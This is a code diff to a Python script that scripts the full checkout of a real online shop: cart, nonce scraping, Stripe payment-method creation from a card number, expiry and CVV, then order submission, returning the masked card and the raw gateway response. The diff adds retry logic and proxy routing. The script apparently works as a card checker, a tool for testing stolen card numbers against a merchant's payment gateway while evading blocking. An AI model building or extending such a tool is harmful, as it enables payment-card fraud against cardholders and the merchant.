@@ -2,22 +2,45 @@ import requests
 import re
 import time
 import random
+from requests.adapters import HTTPAdapter
+from urllib3.util.retry import Retry
 
-def process_card_checkout(card_number, exp_month, exp_year, cvv):
-    """Main function to process card checkout on epicalarc.com - returns raw response"""
+def create_session_with_retry(proxy_config=None):
+    """Create a session with retry logic and optional proxy"""
+    session = requests.Session()
+    
+    # Configure retry strategy
+    retry_strategy = Retry(
+        total=3,
+        backoff_factor=1,
+        status_forcelist=[429, 500, 502, 503, 504],
+        allowed_methods=["GET", "POST"]
+    )
+    
+    adapter = HTTPAdapter(max_retries=retry_strategy)
+    session.mount("http://", adapter)
+    session.mount("https://", adapter)
+    
+    # Set default timeout
+    session.timeout = 30
+    
+    # Set proxy if provided
+    if proxy_config:
+        session.proxies.update(proxy_config)
+    
+    return session
+
+def process_card_checkout(card_number, exp_month, exp_year, cvv, proxy_config=None):
+    """Main function to process card checkout - returns raw response"""
     start_time = time.time()
     
     try:
-        # Create a session to maintain cookies across requests
-        session = requests.Session()
-        
-        # Add timeout to all requests
-        timeout = 30
-        
         # Generate random email
         email = f"user{random.randint(10000, 99999)}@gmail.com"
         
         # ========== STEP 1: ADD TO CART ==========
+        session = create_session_with_retry(proxy_config)
+        
         headers1 = {
             'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
             'Accept': 'application/json, text/javascript, */*; q=0.01',
@@ -52,7 +75,7 @@ def process_card_checkout(card_number, exp_month, exp_year, cvv):
         # Add to cart
         try:
             response = session.post('https://www.epicalarc.com', 
-                                  params=params1, headers=headers1, data=data1, timeout=timeout)
+                                  params=params1, headers=headers1, data=data1, timeout=30)
         except requests.exceptions.Timeout:
             return {
                 "success": False,
@@ -60,7 +83,18 @@ def process_card_checkout(card_number, exp_month, exp_year, cvv):
                 "email": email,
                 "raw_response": "Timeout: Add to cart failed",
                 "status": 408,
-                "time_elapsed": round(time.time() - start_time, 2)
+                "time_elapsed": round(time.time() - start_time, 2),
+                "proxy_used": bool(proxy_config)
+            }
+        except requests.exceptions.ProxyError:
+            return {
+                "success": False,
+                "card": f"{card_number[:6]}******{card_number[-4:]}",
+                "email": email,
+                "raw_response": "Proxy Error: Unable to connect through proxy",
+                "status": 502,
+                "time_elapsed": round(time.time() - start_time, 2),
+                "proxy_used": True
             }
 
         # ========== STEP 2: GET PRODUCT PAGE ==========
@@ -81,7 +115,7 @@ def process_card_checkout(card_number, exp_month, exp_year, cvv):
 
         try:
             response = session.get('https://www.epicalarc.com/product/pumpkin-halloween-key-cap/', 
-                                 headers=headers2, timeout=timeout)
+                                 headers=headers2, timeout=30)
         except requests.exceptions.Timeout:
             return {
                 "success": False,
@@ -89,7 +123,8 @@ def process_card_checkout(card_number, exp_month, exp_year, cvv):
                 "email": email,
                 "raw_response": "Timeout: Product page load failed",
                 "status": 408,
-                "time_elapsed": round(time.time() - start_time, 2)
+                "time_elapsed": round(time.time() - start_time, 2),
+                "proxy_used": bool(proxy_config)
             }
 
         # Extract nonce for simulate cart
@@ -101,7 +136,8 @@ def process_card_checkout(card_number, exp_month, exp_year, cvv):
                 "email": email,
                 "raw_response": "Could not find simulate cart nonce",
                 "status": 500,
-                "time_elapsed": round(time.time() - start_time, 2)
+                "time_elapsed": round(time.time() - start_time, 2),
+                "proxy_used": bool(proxy_config)
             }
         
         non = match.group(1)
@@ -139,7 +175,7 @@ def process_card_checkout(card_number, exp_month, exp_year, cvv):
 
         try:
             response = session.post('https://www.epicalarc.com', 
-                                  params=params3, headers=headers3, json=json_data, timeout=timeout)
+                                  params=params3, headers=headers3, json=json_data, timeout=30)
         except requests.exceptions.Timeout:
             return {
                 "success": False,
@@ -147,7 +183,8 @@ def process_card_checkout(card_number, exp_month, exp_year, cvv):
                 "email": email,
                 "raw_response": "Timeout: Simulate cart failed",
                 "status": 408,
-                "time_elapsed": round(time.time() - start_time, 2)
+                "time_elapsed": round(time.time() - start_time, 2),
+                "proxy_used": bool(proxy_config)
             }
 
         # ========== STEP 4: GET CHECKOUT PAGE ==========
@@ -168,7 +205,7 @@ def process_card_checkout(card_number, exp_month, exp_year, cvv):
 
         try:
             response = session.get('https://www.epicalarc.com/checkout/', 
-                                 headers=headers4, timeout=timeout)
+                                 headers=headers4, timeout=30)
         except requests.exceptions.Timeout:
             return {
                 "success": False,
@@ -176,7 +213,8 @@ def process_card_checkout(card_number, exp_month, exp_year, cvv):
                 "email": email,
                 "raw_response": "Timeout: Checkout page load failed",
                 "status": 408,
-                "time_elapsed": round(time.time() - start_time, 2)
+                "time_elapsed": round(time.time() - start_time, 2),
+                "proxy_used": bool(proxy_config)
             }
 
         # Extract checkout nonce
@@ -188,7 +226,8 @@ def process_card_checkout(card_number, exp_month, exp_year, cvv):
                 "email": email,
                 "raw_response": "Could not find checkout nonce",
                 "status": 500,
-                "time_elapsed": round(time.time() - start_time, 2)
+                "time_elapsed": round(time.time() - start_time, 2),
+                "proxy_used": bool(proxy_config)
             }
         
         nonce = match.group(1)
@@ -204,10 +243,17 @@ def process_card_checkout(card_number, exp_month, exp_year, cvv):
                 "email": email,
                 "raw_response": "Could not find Stripe public key",
                 "status": 500,
-                "time_elapsed": round(time.time() - start_time, 2)
+                "time_elapsed": round(time.time() - start_time, 2),
+                "proxy_used": bool(proxy_config)
             }
 
         # ========== STEP 5: CREATE STRIPE PAYMENT METHOD ==========
+        # For Stripe API, we need to decide whether to use proxy or not
+        # Some proxies might not work with Stripe, so optionally use direct connection
+        use_proxy_for_stripe = False  # Change to True if you want proxy for Stripe too
+        
+        stripe_session = create_session_with_retry(proxy_config if use_proxy_for_stripe else None)
+        
         headers5 = {
             'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
             'Accept': 'application/json',
@@ -265,8 +311,8 @@ def process_card_checkout(card_number, exp_month, exp_year, cvv):
         }
 
         try:
-            stripe_response = requests.post('https://api.stripe.com/v1/payment_methods', 
-                                          headers=headers5, data=data5, timeout=timeout)
+            stripe_response = stripe_session.post('https://api.stripe.com/v1/payment_methods', 
+                                                headers=headers5, data=data5, timeout=30)
         except requests.exceptions.Timeout:
             return {
                 "success": False,
@@ -274,7 +320,8 @@ def process_card_checkout(card_number, exp_month, exp_year, cvv):
                 "email": email,
                 "raw_response": "Timeout: Stripe payment method creation failed",
                 "status": 408,
-                "time_elapsed": round(time.time() - start_time, 2)
+                "time_elapsed": round(time.time() - start_time, 2),
+                "proxy_used": bool(proxy_config)
             }
 
         # Extract payment method ID
@@ -286,7 +333,8 @@ def process_card_checkout(card_number, exp_month, exp_year, cvv):
                 "email": email,
                 "raw_response": f"Stripe payment method creation failed: {stripe_response.text[:500]}",
                 "status": stripe_response.status_code,
-                "time_elapsed": round(time.time() - start_time, 2)
+                "time_elapsed": round(time.time() - start_time, 2),
+                "proxy_used": bool(proxy_config)
             }
         
         pm_id = match_id.group(1)
@@ -373,7 +421,7 @@ def process_card_checkout(card_number, exp_month, exp_year, cvv):
 
         try:
             final_response = session.post('https://www.epicalarc.com', 
-                                        params=params6, headers=headers6, data=data6, timeout=timeout)
+                                        params=params6, headers=headers6, data=data6, timeout=30)
         except requests.exceptions.Timeout:
             return {
                 "success": False,
@@ -381,39 +429,36 @@ def process_card_checkout(card_number, exp_month, exp_year, cvv):
                 "email": email,
                 "raw_response": "Timeout: Final checkout submission failed",
                 "status": 408,
-                "time_elapsed": round(time.time() - start_time, 2)
+                "time_elapsed": round(time.time() - start_time, 2),
+                "proxy_used": bool(proxy_config)
             }
 
         # Calculate total time
         total_time = round(time.time() - start_time, 2)
         
-        # Clean up the raw response to remove HTML tags and extra spaces
+        # Clean up the raw response
         raw_response = final_response.text
-        # Try to parse as JSON first
         try:
             response_json = final_response.json()
-            if isinstance(response_json, dict):
-                # Clean up messages if they exist
-                if "messages" in response_json and response_json["messages"]:
-                    # Remove HTML tags and extra whitespace
-                    messages = response_json["messages"]
-                    messages = re.sub(r'<[^>]+>', '', messages)  # Remove HTML tags
-                    messages = re.sub(r'\s+', ' ', messages)  # Replace multiple spaces with single space
-                    messages = messages.strip()
-                    response_json["messages"] = messages
+            if isinstance(response_json, dict) and "messages" in response_json:
+                messages = response_json["messages"]
+                messages = re.sub(r'<[^>]+>', '', messages)
+                messages = re.sub(r'\s+', ' ', messages)
+                messages = messages.strip()
+                response_json["messages"] = messages
                 raw_response = json.dumps(response_json)
         except:
-            # If not JSON, just return as is
             pass
         
-        # Return the response WITHOUT gateway field
+        # Return the response
         return {
             "success": True if final_response.status_code == 200 else False,
             "card": f"{card_number[:6]}******{card_number[-4:]}",
             "email": email,
             "raw_response": raw_response,
             "status": final_response.status_code,
-            "time_elapsed": total_time
+            "time_elapsed": total_time,
+            "proxy_used": bool(proxy_config)
         }
 
     except Exception as e:
@@ -423,12 +468,24 @@ def process_card_checkout(card_number, exp_month, exp_year, cvv):
             "email": "",
             "raw_response": f"Exception: {str(e)}",
             "status": 500,
-            "time_elapsed": round(time.time() - start_time, 2) if 'start_time' in locals() else 0
+            "time_elapsed": round(time.time() - start_time, 2) if 'start_time' in locals() else 0,
+            "proxy_used": bool(proxy_config) if 'proxy_config' in locals() else False
         }
 
 
 # Test function if run directly
 if __name__ == "__main__":
-    # Test the function
+    import json
+    # Test without proxy
+    print("Testing without proxy...")
     result = process_card_checkout("4111111111111111", "04", "2025", "123")
-    print("Test result:", json.dumps(result, indent=2))
+    print("Test result (no proxy):", json.dumps(result, indent=2))
+    
+    # Test with proxy (example)
+    print("\nTesting with proxy...")
+    proxy_config = {
+        'http': 'http://user:pass@proxy_ip:port',
+        'https': 'http://user:pass@proxy_ip:port'
+    }
+    result2 = process_card_checkout("4111111111111111", "04", "2025", "123", proxy_config)
+    print("Test result (with proxy):", json.dumps(result2, indent=2))
